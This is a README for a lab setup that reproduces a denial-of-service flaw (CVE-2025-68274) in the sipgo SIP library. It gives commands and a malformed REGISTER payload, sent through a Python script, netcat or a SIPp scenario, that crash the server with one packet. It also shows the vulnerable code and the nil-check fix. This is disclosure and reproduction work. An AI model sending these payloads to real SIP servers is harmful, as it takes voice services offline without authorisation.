# Vulnerable SipGo Server - Reproduction Environment

This directory contains a vulnerable SIP server built with the sipgo library to demonstrate the Response DoS vulnerability (CVE-2025-68274 / ES2025-02).

## Vulnerability Summary

The server is vulnerable to a nil pointer dereference in `sip.NewResponseFromRequest()` when processing SIP requests that are missing the `To` header. Any SIP method (REGISTER, INVITE, OPTIONS, etc.) can trigger this crash.

## Setup

1. **Install Go** (1.21 or later)

2. **Initialize the module**:
   ```bash
   go mod tidy
   ```

3. **Run the vulnerable server**:
   ```bash
   # UDP (default)
   go run vulnerable-server.go

   # TCP
   go run vulnerable-server.go -transport tcp -addr 127.0.0.1:5060

   # With debug logging
   go run vulnerable-server.go -debug

   # Custom address
   go run vulnerable-server.go -addr 192.168.1.100:5060
   ```

## Testing the Vulnerability

### Option 1: Using the Python exploit

```bash
# Against UDP server
python3 sipgo-response-dos.py 127.0.0.1 5060

# Against TCP server  
python3 sipgo-response-dos.py 127.0.0.1 5060 tcp
```

### Option 2: Manual testing with netcat

```bash
# Create malformed SIP request without To header
cat > malformed.sip << 'EOF'
REGISTER sip:127.0.0.1:5060 SIP/2.0
Via: SIP/2.0/UDP 192.168.1.100:5060;rport;branch=z9hG4bK-test
From: <sip:test@192.168.1.100>;tag=test
Call-ID: test-call-id
CSeq: 1 REGISTER
Contact: <sip:test@192.168.1.100:5060>
Content-Length: 0

EOF

# Send to UDP server
nc -u 127.0.0.1 5060 < malformed.sip

# Send to TCP server
nc 127.0.0.1 5060 < malformed.sip
```

### Option 3: Using SIPp (if available)

```bash
# Create SIPp scenario without To header
cat > crash_scenario.xml << 'EOF'
<?xml version="1.0" encoding="ISO-8859-1" ?>
<scenario name="Crash Test">
  <send>
    <![CDATA[
      REGISTER sip:127.0.0.1:5060 SIP/2.0
      Via: SIP/2.0/UDP [local_ip]:[local_port];branch=[branch]
      From: <sip:test@[local_ip]>;tag=[pid]SIPpTag00[call_number]
      Call-ID: [call_id]
      CSeq: 1 REGISTER
      Contact: <sip:test@[local_ip]:[local_port]>
      Content-Length: 0

    ]]>
  </send>
</scenario>
EOF

sipp -sf crash_scenario.xml 127.0.0.1:5060 -m 1
```

## Expected Results

When a malformed SIP request without a `To` header is sent to the server:

1. **Server logs** will show the incoming request
2. **Server will crash** with a panic like:
   ```
   panic: runtime error: invalid memory address or nil pointer dereference
   [signal SIGSEGV: segmentation violation code=0x1 addr=0x70 pc=0x...]
   
   goroutine XX [running]:
   github.com/emiago/sipgo/sip.NewResponseFromRequest(...)
       /path/to/sipgo/sip/response.go:242 +0x...
   ```
3. **Server process terminates** immediately

## Vulnerability Details

The crash occurs in `/sip/response.go` at line 242:

```go
if _, ok := res.To().Params["tag"]; !ok {
    uuid, _ := uuid.NewRandom()
    res.to.Params["tag"] = uuid.String()
}
```

When the `To` header is missing from the request:
1. No `To` header gets copied to the response during header copying
2. `res.To()` returns `nil` 
3. Accessing `res.To().Params` causes nil pointer dereference
4. Server crashes with SIGSEGV

## Affected Methods

This vulnerability affects **any SIP method** that results in calling `sip.NewResponseFromRequest()`, including:

- REGISTER
- INVITE  
- OPTIONS
- SUBSCRIBE
- MESSAGE
- Any custom SIP method

## Fix

The vulnerability is fixed by adding a nil check:

```go
// BEFORE (Vulnerable)
if _, ok := res.To().Params["tag"]; !ok {
    uuid, _ := uuid.NewRandom()
    res.to.Params["tag"] = uuid.String()
}

// AFTER (Fixed)
if to := res.To(); to != nil {
    if _, ok := to.Params["tag"]; !ok {
        uuid, _ := uuid.NewRandom()
        to.Params["tag"] = uuid.String()
    }
}
```

## Security Impact

- **CVE**: CVE-2025-68274
- **Availability**: Complete DoS - single malformed packet crashes server
- **Remote**: No authentication required
- **Severity**: High (CVSS 8.7)
- **Affected versions**: >= v0.3.0, < v1.0.0-alpha-1